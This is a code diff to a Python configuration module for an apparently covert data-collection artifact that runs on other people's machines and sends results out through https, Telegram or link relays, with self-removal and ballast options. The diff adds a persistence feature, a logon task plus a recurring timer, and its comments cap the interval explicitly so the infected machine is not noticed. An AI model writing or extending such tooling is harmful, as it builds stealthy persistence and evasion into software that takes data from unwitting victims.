@@ -28,6 +28,11 @@ RELAY_KINDS: Final[tuple[str, ...]] = ("https", "telegram", "link")
 # anything above it is a typo that would fill a disk before it failed.
 MAX_BALLAST_MB: Final[int] = 4096
 
+# How often a persisted artifact may re-run. Above zero the artifact registers a timer as
+# well as a logon task. A day is the ceiling because a machine that collects hourly for a
+# week is a machine somebody notices; one that collects once a day is not.
+MAX_PERSIST_HOURS: Final[int] = 24
+
 
 class ConfigError(ValueError):
     """Raised for any config that does not match the schema.
@@ -81,6 +86,13 @@ class RunConfig:
     # be opened and read in place. On somebody else's machine this is a footprint, which
     # is why it is a decision rather than a habit.
     keep_local: bool = False
+    # Off by default. When on, the artifact copies itself into a durable folder and
+    # registers a logon task, so a machine that reboots produces another result instead
+    # of exactly one. ``persist_hours`` above zero adds a timer at that interval. A file
+    # that survives is a file that can be found, which is why this is a decision and not
+    # a habit, and why it is separate from ``self_remove`` rather than implied by it.
+    persist: bool = False
+    persist_hours: int = 0
 
 
 def _names(cls: type) -> tuple[str, ...]:
@@ -206,6 +218,12 @@ def from_dict(data: Mapping[str, Any]) -> RunConfig:
     keep_local = (
         _as_bool(document["keep_local"], "keep_local") if "keep_local" in document else False
     )
+    persist = _as_bool(document["persist"], "persist") if "persist" in document else False
+    persist_hours = (
+        _as_int_in(document["persist_hours"], "persist_hours", 0, MAX_PERSIST_HOURS)
+        if "persist_hours" in document
+        else 0
+    )
 
     return RunConfig(
         schema_version=version,
@@ -216,6 +234,8 @@ def from_dict(data: Mapping[str, Any]) -> RunConfig:
         self_remove=self_remove,
         ballast_mb=ballast_mb,
         keep_local=keep_local,
+        persist=persist,
+        persist_hours=persist_hours,
     )
 
 
@@ -237,6 +257,8 @@ def to_dict(cfg: RunConfig) -> dict[str, Any]:
         "self_remove": cfg.self_remove,
         "ballast_mb": cfg.ballast_mb,
         "keep_local": cfg.keep_local,
+        "persist": cfg.persist,
+        "persist_hours": cfg.persist_hours,
         "relay": {
             "kind": cfg.relay.kind,
             "endpoint": cfg.relay.endpoint,
@@ -249,6 +271,7 @@ def to_dict(cfg: RunConfig) -> dict[str, Any]:
 
 __all__ = [
     "MAX_BALLAST_MB",
+    "MAX_PERSIST_HOURS",
     "RELAY_FIELDS",
     "RELAY_KINDS",
     "RUN_FIELDS",
